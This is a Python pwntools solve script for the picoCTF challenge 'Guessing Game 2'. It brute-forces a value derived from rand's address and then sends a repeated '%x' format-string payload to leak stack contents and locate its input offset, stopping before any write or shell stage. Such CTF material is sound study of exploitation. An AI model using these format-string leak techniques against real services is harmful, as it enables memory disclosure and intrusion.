#!/usr/bin/env python3

"""
WhatTheFuzz's submission for the picoCTF challenge Guessing Game 2.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

from gzip import READ
from pwn import *

exe = ELF("./vuln")

context.binary = exe
context.log_level = 'info'


def guess_address_of_rand(io):
    '''As opposed to calling `rand()` as in guessing-game-1, this program
    simply defines the random number as the address of rand() % 4096 + 1.
    Since we won't know where the address is located, lets just guess.
    This may change every time, so we don't want to restart the program.
    This will return the answer to the question and leave the program open.
    '''

    log.info('Guessing the address of rand...')
    # Try each number in the range -4096 to 4096.
    for i in range(-4096, 4096):
        io.sendlineafter(b'What number would you like to guess?', str(i).encode())

        io.recvline() # Move past the newline.
        response = io.recvline()
        if response in b'Congrats! You win! Your prize is this print statement!\n':
            return i

    # If we get here, we didn't find the answer.
    raise Exception("Couldn't find the address of random % 4096 + 1.")


def find_input(io):
    '''This looks complicated, but it's not. Essentially, we are feeding known
    input (via the call to cyclic) to the program. We then check the output of
    the string that the program returns. It will have our known string in it.
    Since we will provide it |%x 39 times, it will also print out 39 addresses
    on the stack. One of those values will be our input. This is important to
    find because it gives us a relative read or write at any address.

    Returns an int representing the offset of our input on the stack.
    '''
    max_len_input = 39

    # Count the output.
    # We give the program a known string. We can then examine the output for
    # where the string appears.
    # We only need four bytes worth of characters to match on.
    known_string = cyclic(4)
    # |%x is the format string for hexadecimal with a pipe character
    # prefixing each address.
    name = known_string + max_len_input * b'|%x'


    io.sendlineafter(b'Name? ', name)
    stack_offset = 0
    # Find the offset of the string we sent.
    line = io.recvline_contains(b'Congrats: ')
    for i in line.split(b'|'):
        stack_offset += 1
        try:
            # Stop walking the stack when we find the string we sent.
            if binascii.unhexlify(i) == known_string:
                break
        except:
            pass

    # We intentionally subtract one because the very first characters
    # printed will be our input before we have walked up the stack
    return stack_offset - 1

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('jupiter.challenges.picoctf.org', 13775)

    else:
        io = process([exe.path])

    return io



def main():
    '''Return the flag.
    '''

    with conn() as io:

        # Get the address of rand % 4096 + 1
        addr_rand = guess_address_of_rand(io)
        log.info("Value of rand: {}".format(addr_rand))

        # Figure out where our input is on the stack.
        stack_offset = find_input(io)
        log.info('Found input on stack at offset {}'.format(stack_offset))

        io.interactive()




if __name__ == '__main__':
    main()